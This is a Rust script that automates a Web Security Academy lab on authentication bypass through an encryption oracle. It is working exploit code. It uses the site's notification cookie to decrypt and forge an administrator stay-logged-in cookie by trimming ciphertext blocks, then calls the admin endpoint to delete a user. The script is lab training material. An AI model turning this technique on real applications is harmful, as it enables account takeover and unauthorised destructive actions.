/*******************************************************************************
*
* Lab: Authentication bypass via encryption oracle
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie to login
*      3. Login as wiener
*      4. Extract the stay-logged-in cookie
*      5. Fetch a post page with the stay-logged in cookie value 
*         in the notification cookie to decrypt it
*      6. Extract the decrypted value
*      7. Extract the csrf token to post a comment
*      8. Post a comment with <PADDING>administrator:<NUMBER> 
*         in the email field (where PADDING is 9 bytes and and NUMBER is 
*         extracted from the decrypted value in the previous step )
*      9. Extract the notification cookie
*      10. Decode the notification cookie with base64
*      11. Remove the first two blocks and encode the remaining blocks
*      12. Place the last encoded value in the stay-logged-in cookie 
*          and delete carlos
*
********************************************************************************/
use base64::{engine::general_purpose::STANDARD, Engine};
use lazy_static::lazy_static;
use percent_encoding::{percent_decode, utf8_percent_encode, PercentEncode, NON_ALPHANUMERIC};
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a110062036a119f83e59db100b90060.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch_login_page();

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the csrf token and session cookie to login.. ");
    flush_terminal();

    let mut session = get_cookie(&login_page, "session");
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ");
    flush_terminal();

    let login = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Extracting the stay-logged-in cookie.. ",);
    flush_terminal();

    session = get_cookie_from_multiple_cookies(&login, "session");
    let stay_logged_in = get_cookie_from_multiple_cookies(&login, "stay-logged-in");

    println!("{}", "OK".green());
    print!(
        "⦗5⦘ Fetching a post page with the stay-logged in cookie value in the notification cookie to decrypt it.. "
    );
    flush_terminal();

    let post_page = fetch_post_page_with_cookies(&session, &stay_logged_in);

    println!("{}", "OK".green());
    print!("⦗6⦘ Extracting the decrypted value.. ",);
    flush_terminal();

    let body = post_page.text().unwrap();
    let decrypted = capture_pattern_from_text(r"\s*(wiener:\w*)\s*</header>", &body);
    let numbers_part = decrypted.split(":").nth(1).unwrap();
    let admin_numbers_padding = format!("123456789administrator:{numbers_part}");

    println!("{} => {}", "OK".green(), decrypted.yellow());
    print!("{}", "⦗7⦘ Extracting the csrf token to post a comment.. ",);
    flush_terminal();

    csrf_token = capture_pattern_from_text("csrf.+value=\"(.+)\"", &body);

    println!("{}", "OK".green());
    print!(
        "⦗8⦘ Posting a comment with {} in the email field..",
        admin_numbers_padding.yellow(),
    );
    flush_terminal();

    let post_comment = post_comment(&admin_numbers_padding, &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗9⦘ Extracting the notification cookie.. ",);
    flush_terminal();

    let notification_cookie = get_cookie(&post_comment, "notification");

    println!("{}", "OK".green());
    print!("⦗10⦘ Decoding the notification cookie with base64..",);
    flush_terminal();

    let notification_url_decoded = percent_decode(notification_cookie.as_bytes())
        .decode_utf8()
        .unwrap()
        .to_string();
    let decoded = STANDARD.decode(notification_url_decoded).unwrap();

    println!("{}", "OK".green());
    print!("⦗11⦘ Removing the first two blocks and encode the remaining blocks..");
    flush_terminal();

    let first_two_blocks_removed = &decoded[32..];
    let base64_encoded = STANDARD.encode(first_two_blocks_removed);
    let percent_encoded = utf8_percent_encode(&base64_encoded, NON_ALPHANUMERIC);

    println!("{} => {}", "OK".green(), base64_encoded.yellow());
    print!("⦗12⦘ Placing the last encoded value in the stay-logged-in cookie and delete carlos.. ");
    flush_terminal();

    delete_carlos(percent_encoded);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_login_page() -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/login"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch the login page".red()))
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("stay-logged-in", "on"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn fetch_post_page_with_cookies(session: &str, stay_logged_in: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/post?postId=1"))
        .header(
            "Cookie",
            format!("notification={stay_logged_in}; session={session}"),
        )
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to fetch a post page".red()))
}

fn post_comment(email: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("postId", "1"),
            ("comment", "not important"),
            ("name", "hacker"),
            ("email", &email),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to post a comment".red()))
}

fn delete_carlos(cookie: PercentEncode<'_>) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
        .header("Cookie", format!("stay-logged-in={cookie}"))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to delete carlos from the admin panel".red()
        ))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_cookie(response: &Response, cookie: &str) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text(&format!("{cookie}=(.*);"), cookie_header)
}

fn get_cookie_from_multiple_cookies(response: &Response, cookie_name: &str) -> String {
    let headers = response.headers();

    match cookie_name {
        "stay-logged-in" => {
            let first_cookie = headers.get_all("set-cookie").iter().nth(0);
            let first_cookie_as_string = first_cookie.unwrap().to_str().unwrap();
            capture_pattern_from_text("stay-logged-in=(.*);", first_cookie_as_string)
        }
        "session" => {
            let second_cookie = headers.get_all("set-cookie").iter().nth(1);
            let second_cookie_as_string = second_cookie.unwrap().to_str().unwrap();
            capture_pattern_from_text("session=(.*);", second_cookie_as_string)
        }
        _ => "".to_string(),
    }
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
